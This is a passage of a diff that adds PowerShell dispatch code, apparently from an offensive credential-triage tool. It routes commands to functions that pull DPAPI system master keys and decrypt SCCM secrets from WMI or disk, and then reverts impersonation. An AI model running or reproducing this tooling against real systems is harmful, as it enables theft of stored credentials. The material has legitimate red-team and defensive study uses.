+                    Triage-SccmDisk -MasterKeys $MasterKeys
+                }
+                
+                "SCCM_WMI" {
+                    
+                    $MasterKeys = Triage-SystemMasterKeys
+                    Triage-SccmWMI -MasterKeys $MasterKeys
+                }
+                
+                "SCCM_DISK" {
+                    
+                    $MasterKeys = Triage-SystemMasterKeys
+                    Triage-SccmDisk -MasterKeys $MasterKeys
+                }
+                
+                Default {
+                    
+                    Write-Host "[*] Command not recognised"
+                }
+            }
+        }
+        
+        finally {
+            
+            if (Get-Variable -Name "mappings" -Scope "Global" -ErrorAction "SilentlyContinue")
+            {
+                Remove-Variable -Name "mappings" -Scope "Global" -Force
+            }
+            
+            $FnRevertToSelf.Invoke() > $null
+        }
+    } *>&1 | Out-String
+
+    Write-Output $output
+} 
+
 $Out | Out-string
 '@ 
 
